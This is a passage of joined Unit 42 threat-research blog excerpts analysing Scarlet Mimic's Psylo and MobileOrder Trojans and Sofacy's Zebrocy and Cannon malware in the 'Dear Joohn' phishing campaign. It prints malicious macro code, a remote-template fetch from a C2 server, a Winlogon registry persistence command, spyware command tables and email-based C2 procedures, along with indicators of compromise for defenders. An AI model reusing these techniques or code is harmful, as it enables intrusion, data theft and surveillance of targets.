of FakeM because Psylo has a command handler that differs dramatically from FakeM. Table 5 shows the Psylo command handler, which suggests it is less modular and supports more embedded functionality when compared to FakeM. It is possible that the threat actors created this Trojan as a standalone alternative to FakeM.\\nCommand\\nDescription\\n0\\nIdles for 10 seconds.\\n2\\nEnumerate all storage devices.\\n3\\nFind all files that starts with a particular string (%s*.*).\\n5\\nCreates a file to write to, deleting it if it already exists. Combined with ‘E’ command to download a file to the system.\\nE\\nWrites data from C2 to a file opened using the ‘5’ command. Combined with ‘5’ command to download a file to the system.\\n6\\nReads a file, which effectively uploads the file to the C2.\\n7\\nDelete a specified file.\\n8\\nExecute a command using WinExec. Responds to C2 with ‘s’ if successful or ‘r’ if unsuccessful.\\n9\\nTimestomps. Sets a specified file’s timestamps to match that of a system file in the System32 directory.\\nTable 5: Command handler in Psylo that differs dramatically from FakeM\\nMobileOrder: Mobile Devices the Next Frontier\\nAnother discovery we made while researching this blog is an overlap between Psylo infrastructure and a Trojan focused on compromising Android mobile devices. Unit 42 tracks this mobile Trojan as MobileOrder, as the authors specifically refer to commands within the app as orders. The connection between FakeM, Psylo, and MobileOrder suggest that Scarlet Mimic is now expanding their espionage efforts from PCs to mobile devices, which marks a major shift in tactics.\\nMobileOrder starts by registering itself as device administrator so that a normal user cannot uninstall it by simply clicking “uninstall” in settings. It will copy an embedded PDF file from “res/raw/rd.pdf” to SD card “/android/9074ca3f18e201c204ec1d852264bb5432644ba46f54f361a146957.pdf” and launches the mobile device’s default PDF viewer to display this PDF file, which acts as a decoy document. After displaying the decoy document, the malicious code runs in background. The malicious code consists of the following parts:\\nAn Android geographical location SDK provided by AMAP.\\nActor developed code that carries out Trojan’s functionality.\\nThe malware uses the AMAP SDK to get accurate location of infected devices by GPS, mobile network (such as base stations), WiFi and other information. MobileOrder acts on instructions provided by its C2 server, which it communicates with over TCP port 3728. All C2 communications are encrypted with the AES algorithm using a key generated by computing five MD5 hashes starting with the key “1qazxcvbnm”, and adding a salt value of “.)1/” in each iteration.\\nThe C2 server will respond to requests from MobileOrder with commands that the Trojan refers to as “orders”. MobileOrder contains a command handler with functionality that provides a fairly robust set of commands, as seen in Table 6. The first byte of data provided by the C2 server is order number, which is followed by the encrypted data that needed to carry out the specific order.\\nOrder #\\nOrder Name\\nBehaviors\\n18\\nOrder_Folder_List\\nUpload names and attributes of files under specified path\\n20\\nOrder_Process_List\\nUpload all running processes information\\n24\\nOrder_HostInfo\\nUpload device information including IMEI, IMSI, SIM card serial number, phone number, Android version, device manufacturer, device model, SD card size, network type, device locking status, country, carrier, time zone, language, install app list, browser bookmarks, etc.\\n26\\nOrder_FileDelete\\nDelete specified file\\n27\\nOrder_DownLoad\\nDownload specified file to SD card’s Android/data/tmp/ directory.\\n28\\nOrder_UpFile\\nUpload specified file to C2 server\\n51\\nOrder_Sms\\nUpload all received and sent SMS addresses, content, date, time to C2 server\\n52\\nOrder_Contact\\nUpload all contacts’ information to C2 server\\n53\\nOrder_Call\\nUpload all phone calling history information\\n54\\nOrder_Camera_front_photo\\nTake a picture by device’s front camera\\n56\\nOrder_SetSleepTime\\nSet sleep time interval\\n57\\nOrder_SetOnline\\nStop sleep\\n58\\nOrder_SetMediaRecorder\\nStart audio recorder in specified time\\n59\\nOrder_GetLoc\\nUpload information about network operator, MCC, MNC, network type, GSM cell location, CID, LAS, BSSS, etc. This information can be used to locate the device.\\n60\\nOrder_GetGps\\nUpload GPS location by AMAP SDK.\\n61\\nOrder_SetTelRecorderOn\\nActivate phone calling recording\\n62\\nOrder_SetTelRecorderOff\\nDeactivate phone calling recording\\n81\\nOrder_Install\\nInstall specified APK file.

There are also infrastructure ties between some FakeM variants and older activity using Trojans such as Elirks, Poison Ivy, and BiFrost, which were used in attacks as old as 2009. The domain names used to host C2 servers are a mix of actor-registered and Dynamic DNS (DDNS,) though most are DDNS. The DDNS domains in turn are linked to a small grouping of ASNs, with one ASN often largely tied to one FakeM variant. Most of the FakeM MSN C2s resolve to IP addresses associated with ASN 22781 (RBLHST – Reliablehosting.com). However, we found one MSN sample that shared infrastructure with some FakeM Custom SSL variants.\\nThere is a similar overlap between FakeM MSN, FakeM HTML, and FakeM SSL. The registrant email xsldmt@xj163.cn was used to register several domains used as C2s: yourturbe.org, websurprisemail.com and googmail.org. One of these domains was also used in the 2013 CallMe activity at the same time it was being used for FakeM MSN samples. The targeting and decoy style also matches with the FakeM activity.\\nThere is PE resource overlap between some FakeM MSN samples and some samples of the BiFrost and Poison Ivy Trojan. This may indicate that the same developer who created the particular BiFrost and Poison Ivy samples was also involved in developing FakeM MSN. Unit 42 found an overlap between the RT_VERSION resources, which contains the version information of a Portable Executable (PE) file, shared amongst the three different Trojans. The shared RT_VERSION resource (MD5: 55b7a118203a831cc69b37b785015c54) contained the following information:\\nComments: Release\\nCompanyName: Develop Team\\nFileDescription: Utility Application\\nFileVersion: 4.0\\nInternalName: Utility\\nLegalCopyright: Copyright (C) 2008\\nLegalTrademarks: DT.Inc\\nOriginalFilename: Utility.EXE\\nPrivateBuild: 4.0b\\nProductName: Utility Application\\nProductVersion: 4.0\\nThe overlap between Elirks, FakeM SSL, Psylo, and MobileOrder exists entirely in their command and control infrastructure, through domain names and/or IP resolution. Samples of these three used some of the same C2 domains, notably lenovositegroup.com, ufoneconference.com, and websurprisemail.com, while some resolution overlap includes 118.193.212.12, 210.206.219.241, and 59.188.239.117. Similarly, some FakeM Yahoo C2 domains and FakeM Custom SSL C2 domains also have overlapping IP resolutions, notably 95.154.204.198.\\nScarlet Mimic also uses the infamous HTRAN tool on at least some of their C2 servers. HTRAN is a proxying tool that allows actors to conceal the true location of their C2 server. Actors will run HTRAN on a server and configure their malware to interact with that server; however, the actor will configure HTRAN to forward traffic to another server where the actual C2 server exists. For example, the FakeM C2 domain of “muslim.islamhood.net”1 resolved to the IP address 59.188.239.117 during analysis, but the server responded with the following error message:\\nSERVERconnection to 68.71.35.135:8081 error\\nThis error message suggests that the HTRAN application running on 59.188.239.117 was unable to connect to the real C2 server hosted at 68.71.35.135.\\nPrior Publications\\nThroughout this report, we have referenced multiple previous blogs and white papers, from Unit 42 and others, that have documented elements of this threat in the past. In addition to those documents readers may also find the following publications interesting.\\nIn 2014, Citizen Lab released a paper on threats against civil society that referenced some of these attacks as the “Domain Name Family” or DNF.\\nKaspersky Lab has produced excellent research on attacks against Uyghur and Tibetan activists. In 2013, they identified an Android Trojan that was also targeting these groups. Our analysis indicates this malware is different from the MobileOrder Trojan described above, but they serve very similar purposes.\\nOn January 12, 2016, Cylance published a blog linking an exploit document to the group Mandiant refers to as APT2 and CrowdStrike as “Putter Panda.” While there does appear to be a small overlap between IP addresses used in attacks from this group and those of Scarlet Mimic, our team has not concluded that these groups are one in the same.\\nConclusion\\nThe information discovered by Unit 42 and shared here indicates Scarlet Mimic is likely a well-funded and skillfully resourced cyber adversary. Scarlet Mimic has carried out attacks using both spear-phishing and watering holes since at least 2009 with increasingly advanced malware, and has deployed malware to attack multiple operating systems and platforms. Despite the apparent technical acumen, their decoy documents are typically not well crafted regardless of the use of the target’s language, though they do use timely subject lures.\\nThe primary source of data used in this analysis is Palo Alto Networks WildFire, which analyzes malware used in attacks from around the globe. The system is also fed with malware samples collected through sharing partnership with other security vendors, including our partners in the Cyber Threat Alliance. To connect attacks to each other based on malware behavior and command and control infrastructure, we relied on Palo Alto Networks AutoFocus threat intelligence.

      "'Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan\\nMenu\\nTools\\nPlaybooks\\nSpeaking Events\\nAbout Us\\nSofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan\\n21,322\\npeople reacted\\n2\\n13\\nmin. read\\nShare\\nBy Robert Falcone and Bryan Lee\\nNovember 20, 2018 at 6:00 AM\\nCategory: Unit 42\\nTags: Cannon, Sofacy, Zebrocy\\nThis post is also available in:\\n日本語 (Japanese)In late October and early November 2018, Unit 42 intercepted a series of weaponized documents that use a technique to load remote templates containing a malicious macro. These types of weaponized documents are not uncommon but are more difficult to identify as malicious by automated analysis systems due to their modular nature. Specific to this technique, if the C2 server is not available at the time of execution, the malicious code cannot be retrieved, rendering the delivery document largely benign.\\nThe weaponized documents targeted several government entities around the globe, including North America, Europe, and a former USSR state. Fortunately for us, the C2 servers for several of these documents were still operational allowing for retrieval of the malicious macro and the subsequent payloads. Analysis revealed a consistent first-stage payload of the well-documented Zebrocy Trojan. Additional collection of related documents revealed a second first-stage payload that we have named ‘Cannon’. Cannon has not been previously observed in use by the Sofacy group and contains a novel email-based C2 communication channel. Email as a C2 channel is not a new tactic, but it is generally not observed in the wild as often as HTTP or HTTPS. Using email as a C2 channel may also decrease the chance of detection, as sending email via non-sanctioned email providers may not necessarily construe suspicious or even malicious activity in many enterprises.\\nThe activity discussed in this blog revolves around two of the multitude of weaponized documents that we collected. These two documents shared multiple data artifacts, such as a shared C2 IP, shared author name, and shared tactics. Details of the extended attack campaign associated with the Cannon Trojan will be discussed in a later blog. A particularly interesting aspect of one of the two documents we analyzed was the filename used, crash list(Lion Air Boeing 737).docx. This is not the first instance of an adversary group using recent current events as a lure, but it is interesting to see this group attempt to capitalize on the attention of a catastrophic event to execute their attack.\\nAttack Details\\nThe initial sample we intercepted was a Microsoft Word document (SHA256: 2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f) with the filename crash list(Lion Air Boeing 737).docx using the author name Joohn. This document appeared to be targeting a government organization dealing with foreign affairs in Europe via spear-phishing. Once the user attempts to open the document, Microsoft Word immediately attempts to load the remote template containing a malicious macro and payload from the location specified within the settings.xml.rels file of the DOCX document, as seen here:\\n<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"hxxp://188.241.58.170/live/owa/office.dotm\" TargetMode=\"External\"/>\\n1\\n<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"hxxp://188.241.58.170/live/owa/office.dotm\" TargetMode=\"External\"/>\\nIf the C2 has already been taken offline the document will still open, but Word will be unable to retrieve the remote template and thus Word will not load a macro. In this situation, Word will present the same lure document to the victim as seen in Figure 2, but without the ability to enable macros via an Enable Content button. Assuming the C2 is still operational however, Word loads the remote template (SHA256: f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5) and the user is presented with the screen as seen in Figure 1.\\nFigure 1 Lure screen\\nOnce the victim presses the Enable content button, the embedded macro is executed. The macros used for these delivery documents use a less common method of using the AutoClose function. This is a form of anti-analysis as Word will not fully execute the malicious code until the user closes the document. If an automated sandbox exits its analysis session without specifically closing out the document, the sandbox may miss the malicious activity entirely. Once successfully executed, the macro will install a payload and save a document to the system. Typically, we expect to see a decoy document saved to the system and later displayed to make the victim less suspicious of malicious activity; however, in this case the document saved to the system was never displayed and does not contain any pertinent content to the Lion Air tragedy theme seen in the filename. The macro obtains the document saved to the system from within the document stored as UserForm1.Label1.Caption and will write it to:\\n%TEMP%\\\\~temp.docm\\nThe macro obtains the payload saved to the system from within the document stored as UserForm1.Label2.Caption and will write it to:\\n%APPDATA%\\\\MSDN\\\\~msdn.exe\\nThe macro executes this payload in a rather interesting way by loading the dropped ~temp.docm document and calling a function within its embedded macro to run the payload. We believe the creator of this delivery document chose to run the payload from the dropped file as an evasion technique. Also, the fact the initial macro uses this dropped document for the execution of the payload may also explain why the document did not contain any decoy contents.\\nTo carry out this functionality, after writing the \\xa0~temp.docm and ~msdn.exe files to the system, the initial macro will load the ~temp.docm file as a Word Document object and attempts to run the function Proc1 in the Module1 macro within the ~temp.docm file, as seen in the following code snippet:\\nSet WA = CreateObject(\"Word.Application\")\\nWA.Visible = False\\nSet oMyDoc = WA.Documents.Open(vF)\\nWA.Application.Run \"Module1.Proc1\"\\n1234\\nSet WA = CreateObject(\"Word.Application\")WA.Visible = FalseSet oMyDoc = WA.Documents.Open(vF)WA.Application.Run \"Module1.Proc1\"\\nThe Proc1 function within the Module1 does nothing more than build the %APPDATA%\\\\MSDN\\\\~msdn.exe path to the dropped payload and executes it using the built-in Shell function, as seen in the following code snippet:\\nvAdd = \"~msdn\"\\nvFileName = Environ(\"APPDATA\") & \"\\\\MSDN\\\\\"\\nvFileName = vFileName + vAdd & \".e\" + \"x\" & \"e\"\\nShell vFileName\\n1234\\nvAdd = \"~msdn\"vFileName = Environ(\"APPDATA\") & \"\\\\MSDN\\\\\" vFileName = vFileName + vAdd & \".e\" + \"x\" & \"e\"Shell vFileName\\nThe payload dropped to the system (SHA256: 6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a) is a UPX packed Zebrocy variant written in the Delphi language. This variant of Zebrocy is functionally very similar to the Delphi-based payloads discussed in our previous publication on Sofacy attacks using Zebrocy earlier this year. The developer of this particular payload configured it to use the following URL to communicate with as its C2:\\nhxxp://188.241.58.170/local/s3/filters.php\\nThe Zebrocy Trojan gathers system specific information that it will send to the C2 server via an HTTP POST request to the above URL. Like other Zebrocy samples, this Trojan collects system specific information it will send to the C2 server by running the command SYSTEMINFO & TASKLIST on the command line and by enumerating information about connected storage devices. This specific variant of Zebrocy will also send a screenshot of the victim host as a JPEG image to the C2 server. The C2 server will then provide a secondary payload to the beacon in ASCII hexadecimal representation, which the Trojan will decode and write to the following location:\\n%APPDATA%\\\\Roaming\\\\Audio\\\\soundfix.exe\\nDuring our analysis, the C2 server provided a secondary payload that functionally appeared similar to the initial Zebrocy sample. The secondary payload was also written in Delphi and its developer configured it to communicate with its C2 server using HTTPS via the following URL:\\nhxxps://200.122.181.25/catalog/products/books.php\\nNew Cannon Trojan\\nWe were able to collect a second delivery document that shared the Joohn author from the crash list(Lion Air Boeing 737).docx document, as well as the 188.241.58.170\\xa0C2 IP to host its remote template. Structurally this sample was very similar to the initially analyzed document, but the payload turned out to be a completely new tool which we have named Cannon.\\nThe tool is written in C# whose malicious code exists in a namespace called cannon, which is the basis of the Trojan’s name. The Trojan functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server. To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587. The specific functions of Cannon can be seen in Table 1. This tool also has a heavy reliance on EventHandlers with timers to run its methods in a specific order and potentially increase its evasion capability.\\nFunction\\nDescription\\nTimer (seconds)\\nstart_Tick\\nAdds persistence and generates unique system specific identifier\\n1\\ninf_Tick\\nGathers system information\\n300\\nscreen_Tick\\nTakes a screenshot of the desktop\\n10\\ntxt_Tick\\nLogs into primary POP3 account and gets secondary POP3 account\\n120\\nload_Tick\\nLogs into secondary POP3 account to download attachment to email\\n120\\nsubject_Tick\\nLogs into primary POP3 account to get path to for the downloaded attachment\\n120\\nrun_Tick\\nMoves the downloaded attachment to path and creates a process with attachment\\n60\\nTable 1 Functions executed by Cannon and their purpose\\nThe overall purpose of Cannon is to use several email accounts to send system data (system information and screenshot) to the threat actors and to ultimately obtain a payload from an email from the actors. The image in Figure 2, in addition to the following step-by-step process illustrates how Cannon communicates with the actor-controlled C2 email address to obtain a secondary payload:\\nFigure 2 C2 process flow for Cannon\\nCannon gathers system information and saves it to a file named ini. The Trojan sends an email to sahro.bella7atpost.cz with i.ini as the attachment, S_inf within the body and a subject with a unique system identifier via SMTPS from one of the following accounts:\\nBishtr.cam47\\nLobrek.chizh\\nCervot.woprov\\nCannon takes a screenshot and saves it to a file named ops. The Trojan sends an email to sahro.bella7atpost.cz with sysscr.ops as the attachment, the string SCreen within the body and a subject with the unique system identifier via SMTPS from one of three previously used accounts.\\nThe actors likely log into sahro.bella7atpost.cz and process the system information and screenshot sent by the Trojan to determine if the compromised host is of interest. If the actor wishes to download an additional payload to the compromised host, they will respond by sending emails in the following steps.\\nThe actor sends an email to trala.cosh2atpost.cz with the unique system identifier as a subject with a secondary email account and credentials in ASCII hexadecimal format within the message body. This secondary email account is unknown at this time, so we will refer to it as “secondary email account” in future steps.\\nThe actor sends an email to the secondary email account with the unique system identifier as a subject with a secondary payload attached with a filename of txt.\\nCannon logs into the\\xa0trala.cosh2atpost.cz account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and decodes the hexadecimal data in the body of the message to obtain the secondary email account.\\nCannon acknowledges the receipt of the secondary email address by sending an email to\\xa0sahro.bella7atpost.cz with s.txt (contains {SysPar = 65} string) as the attachment, ok within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.\\nThe actor sends an email to\\xa0trala.cosh2atpost.cz with the unique system identifier as a subject with a file path that the Cannon Trojan will use to save the secondary payload.\\nCannon logs into the secondary email account via POP3S looking for emails with a subject that matches the unique system identifier.

In these attacks, the delivery documents used to install Zebrocy used remote templates, which increases the difficulty to analyze the attack as an active C2 server is needed to obtain the macro-enabled document. The Sofacy group also leveraged the recent Lion Air disaster as a lure in one of these attacks, which continues to show a willingness to use current events in their social engineering themes.\\nOf note, we also discovered the Sofacy group using a very similar delivery document to deliver a new Trojan called Cannon. Cannon uses SMTPS and POP3S as its C2 channel compared to Zebrocy that uses a more commonly observed HTTP or HTTPS based C2. This is not a new tactic but may be more effective at evading detection as the external hosts involved are a legitimate email service provider. Add the layer of encryption that the SMTPS and POP3S protocols provide to the legitimate web-based service and you have a very difficult C2 channel to block\\nWhile\\xa0Sofacy’s campaign delivering Zebrocy and Cannon\\xa0remains active, Palo Alto Networks customers are protected from this threat in the following ways:\\nAutoFocuscustomers can track these samples with the\\xa0Zebrocy\\xa0and Cannon\\nWildFiredetects the delivery documents, Zebrocy and Cannon payloads discussed in this blog with malicious verdicts.\\nTraps blocks the macro-ladened remote templates as Suspicious macro detected,\\xa0as well as Zebrocy and Cannon payloads as Suspicious executable detected.\\nThe IP addresses hosting remote templates and C2 services in these attacks are classified as Command and Control.\\nIndicators of Compromise\\nDelivery Hashes\\n2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f\\naf77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392\\nRemote Template Hashes\\nf1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5\\nfc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557d\\nRemote Templates\\nhxxp://188.241.58.170/live/owa/office.dotm\\nZebrocy Hashes\\n6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a\\nZebrocy C2 URLs\\nhxxp://188.241.58.170/local/s3/filters.php\\nhxxps://200.122.181.25/catalog/products/books.php\\nCannon Hashes\\n61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e\\nCannon Email Accounts\\nsahro.bella7atpost.cz\\ntrala.cosh2atpost.cz\\nbishtr.cam47atpost.cz\\nlobrek.chizhatpost.cz\\ncervot.woprovatpost.cz\\nAppendix\\nThe Cannon Trojan is written in C# and functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server. To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587. This tool uses a variety of functions that are run in a specific order to:\\nGather system information and a screenshot\\nSend the gathered information to the actor via an email\\nCheck inbox for email from actor with payload attached\\nDownload payload attached to email\\nExecute downloaded payload\\nThe functions called to carry out these activities are as follows:\\nstart_Tick\\nThis function starts off by writing the string {SysPar = 65}\\xa0to a file named s.txt, which will be used during C2 communications throughout the execution of this Trojan. This function is also responsible for creating persistence by writing the following to r.bat\\xa0and executing it:\\nREG ADD “HKCU\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon” /v Shell /t REG_SZ /d path to wsslc.exe\\nIt also creates a unique system specific identifier that it will use during the C2 communications to send and receive messages. The system specific identifier is a 16 character string that the Trojan creates using the serial number of the C volume and the first 4 hexadecimal bytes from Environment.UserName. The start_Tick function then begins the timer to run the inf_Tick method.\\ninf_Tick\\nResponsible for gathering system information, which it then saves to the i.ini file:\\nApplication.ExecutablePath\\nEnvironment.OSVersion\\nEnvironment.SystemDirectory\\nEnvironment.UserDomainName\\nEnvironment.MachineName\\nEnvironment.UserName\\nTimeZone.CurrentTimeZone.StandardName\\nEnvironment.TickCount\\nDriveInfo.GetDrives() – Name,VolumeLabel,DriveFormat,DriveType,TotalSize,AvailableFreeSpace,Serial number\\nFolders in C:\\\\Program Files\\\\\\nFolders in C:\\\\Program Files (x86)\\\\\\nProcess.GetProcesses\\nIt will use the aforementioned authentication credentials to log into the SMTP server to send the i.ini file to the C2 email address. The email sent to exfiltrate this information will have i.ini attached to it with the unique system identifier as the subject and S_inf within the body of the email message. The inf_Tick function then begins the timer to run the screen_Tick\\xa0method.\\nscreen_Tick\\nTakes a screenshot of the desktop and saves it to a file named sysscr.ops. It will use the aforementioned authentication credentials to log into the SMTP server to send the sysscr.ops file to the C2 email address. The email sent to exfiltrate this information will have sysscr.ops file attached to it with the unique system identifier as the subject and SCreen within the body of the email message. The screen_Tick function then begins the timer to run the txt_Tick\\xa0method.\\ntxt_Tick\\nThe Trojan will attempt to log into pop.seznam.cz over POP3s using the account name trala.cosh2atpost.cz. If successful, the Trojan will access the messages in the inbox, specifically looking for any emails that have a subject that matches the unique system identifier. If an email exists, the Trojan will treat the email’s body as hexadecimal format and save it to a variable that will be used by the load_Tick\\xa0function. The Trojan will delete the email after reading and processing these emails.\\nIf the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address. The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and the string\\xa0ok within the body of the email message. The txt_Tick function then begins the timer to run the load_Tick\\xa0method.\\nload_Tick\\nThe Trojan will first remove all occurrences of B& and Db from the text obtained from the email in the txt_Tick function. The Trojan will then split the remaining text on the % character and treat the content to the left of the % character as an account name and the content to the right as a password. The Trojan uses these credentials to log into another email account at pop.seznam.cz via POP3s, which it will check for email messages that have the unique system identifier as the subject. The Trojan will parse emails with the correct subject to obtain its attachments. The Trojan will save any attachments whose names contain the string auddevc to the system, which is meant to download a file named auddevc.txt. The Trojan will also create a file named l.txt that it will write the string 090 to.\\nIf the Trojan obtained the file from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the l.txt file to the C2 email address. The email sent to exfiltrate this information will have l.txt file attached to it with the unique system identifier as the subject and ok2 within the body of the email message. The load_Tick function then begins the timer to run the subject_Tick method.\\nsubject_Tick\\nThis function is very similar in functionality to the txt_Tick\\xa0function. Just like the txt_Tick\\xa0function, the Trojan will attempt to log into pop.seznam.cz over POP3s using the account name trala.cosh2@post.cz, again looking for subject of emails in the inbox that match the unique system identifier. The Trojan will then treat the body of the email as hexadecimal data that it will save to a variable that will be used by the run_Tick\\xa0function. The contents saved to the variable should be the path in which the actor wishes the file saved in the load_Tick\\xa0function to be moved to and run from.\\nIf the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address. The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and ok3 within the body of the email message. The subject_Tick function then begins the timer to run the run_Tick\\xa0method.\\nrun_Tick\\nThe Trojan will first attempt to create the directory within the path obtained from the email in the subject_Tick\\xa0function. It then attempts to move the auddevc.txt file downloaded in the load_Tick\\xa0function to the newly created directory. If the file was successfully moved, the Trojan it will use the aforementioned authentication credentials to log into the SMTP server to send the l.txt file to the C2 email address. The email sent to exfiltrate this information will have l.txt file attached to it with the unique system identifier as the subject and ok4 within the body of the email message.\\nThe Trojan then attempts to create a process using the newly moved downloaded file. If the Trojan was able to successfully run the download file, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address. The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and ok5 within the body of the email message. The Trojan would then delete the sysscr.ops screenshot file and the i.ini system information file before exiting.\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I\\'m not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

The majority of targets were NATO-aligned nation states, although several former USSR nation states were also targeted. The attacks primarily deployed variants of the Zebrocy tool, which we have previously analyzed. A smaller subset of the delivery documents\\xa0 delivered Cannon or a Zebrocy Delphi variant as reported by ESET. Since we began tracking the use of Zebrocy going back to mid-2015, we have observed a significant increase in frequency of deployment of this tool. Compared to other backdoor tools associated with the Sofacy group, the use of Zebrocy in attack campaigns is far more widespread.\\nThe cluster of activity we detail in this blog revolves primarily around a common author name used in each of the delivery documents: Joohn. Our initial sample of interest was the delivery document using the crash list(Lion Air Boeing 737).docx filename, which delivered the Zebrocy tool. By leveraging our AutoFocus threat intelligence platform in conjunction with data collected from VirusTotal, we were able to pivot from artifacts discovered in the metadata and behaviors to discover the Cannon tool, as well as a number of additional delivery documents, payloads, and targets. The attack vector for all of these attacks appears to be via spear-phishing, using email accounts registered to legitimate email providers instead of spoofed email addresses or previously compromised accounts. The account names visually look similar to legitimate government organization names or other trusted third-party entities. The delivery documents were functionally all the similar, using the remote template function in Microsoft Word to retrieve a malicious macro from the first stage C2 and ultimately loading and executing an initial payload. The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document.\\nIn all, we intercepted nine weaponized documents spanning from October 17, 2018 through November 15, 2018 all sharing the same Joohn author name and delivering variants of either Zebrocy or Cannon. The target radius of our dataset spans four continents, covering government agencies at the federal level all the way to local government agencies. We also conducted timeline analysis using the collected data which allowed us to discover how the Sofacy group timed their attacks in the Dear Joohn campaign and also how they may have crafted their attacks using automated tools.\\nAttack Details\\nBeginning on October 17, 2018, we collected a total of nine delivery documents sent to a multitude of organizations around the world. The targets included a foreign affairs organization in North America, foreign affairs organizations in Europe, as well as government entities in former USSR states. We also discovered evidence of possible targeting of local law enforcement agencies around the world, covering North America, Australia, and Europe. Our telemetry also showed possible targeting of NGOs, marketing firms, as well as organizations in the medical industry. The attack vector of these attacks was all via spear-phishing, using email accounts registered to the free email provider Seznam, a popular web services provider located in the Czech Republic. An example can be seen in Figure 1.\\nFigure 1 Example spear-phishing email delivered in Dear Joohn attacks\\nIn this campaign, the Sofacy group appears to have relied heavily on filenames to lure victims into launching the weaponized documents. Filenames ranged from topics alluding to Brexit, the Lion Air crash, and recent rocket attacks in Israel. The full list of filenames we were able to collect can be seen in Table 1. Although the filenames appeared to be highly targeted and pertinent to the victims, the actual lure content of the documents were far more generic as seen in Figure 2.\\nFigure 2 Generic lure image\\nIn November 2018, the adversary shifted tactics and began implementing non-generic lure content for their weaponized documents. We collected three samples heavily targeting NATO-aligned nation states at this time, using three different lures as seen in Figure 3.\\nFigure 3 Targeted lure content\\nIn one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state. Unpacking the document revealed that the unobfuscated image was a screenshot of a cover page regarding a NATO workshop in the targeted nation state. The other two documents had very similar lures to each other, presenting garbled text to the target with instructions for the victim on how to properly view the document. Interestingly, one of them contained instructions in Russian, which may indicate the intended target was a Russian speaking nation-state.\\nEach of these weaponized documents used the same tactic for their attacks. Upon opening the document, it leveraged the ability of Microsoft Word to retrieve a remote template to then load a malicious macro document as seen in Figure 4.\\nFigure 4 Microsoft Word attempting to download the remote template\\nIf the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session. The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5. If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded.\\nFigure 5 Remote template document requesting the user to click “Enable Content” to run macro\\nClustering\\nThe delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together. Most notably, the author name\\xa0Joohn was\\xa0used repeatedly in each delivery document. There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field.\\nHash\\nFilename\\nCreated By\\nLast Modified By\\nRemote Template Location\\nRemote Template Hash\\nc20e5d56b3..\\n1500029.docx\\nJoohn\\nJoohn\\n185.203.118.198\\n86bb3b00bc..\\nabfc14f7f7..\\nPassport.docx\\nJoohn\\nJoohn\\n185.203.118.198\\n86bb3b00bc..\\n40318f3593..\\nDN_325_170428_DEA Basic Narcotics Investigation Course invitation.docx\\nJoohn\\nJoohn\\n145.249.105.165\\n2da5a388b8..\\n5749eb9d7b..\\n2018_10_13_17_15_21.docx\\nJoohn\\nJoohn\\n145.249.105.165\\n0d7b945b9c..\\n2cfc4b3686..\\ncrash list(Lion Air Boeing 737).docx\\nJoohn\\nJoohn\\n188.241.58.170\\nf1e2bceae8..\\naf77e845f1..\\nЗаявление.docx\\nJoohn\\nJoohn\\n188.241.58.170\\nfc69fb278e..\\n34bdb5b364..\\nRocket attacks on Israel.docx\\nuser\\nJoohn\\n109.248.148.42\\ned8f52cdfc..\\n79bd5f3486..\\n201811131257.docx\\nUSER\\nJoohn\\n109.248.148.42\\nb9f3af84a6..\\n77ff53211b..\\nBrexit 15.11.2018.docx\\nDIP 89 OIC Condemns 14 Nov Attacks.docx\\n15.11 attacks.docx\\nUSER\\nJoohn\\n109.248.148.42\\n<Unknown>\\nTable 1 Delivery documents seen in the Dear Joohn attack campaign\\nThe remote template documents retrieved by\\xa0the delivery documents in Table 1 also shared a common author name, using the string\\xa0xxx.Table 2 shows the remote templates downloaded by delivery documents in this attack campaign.

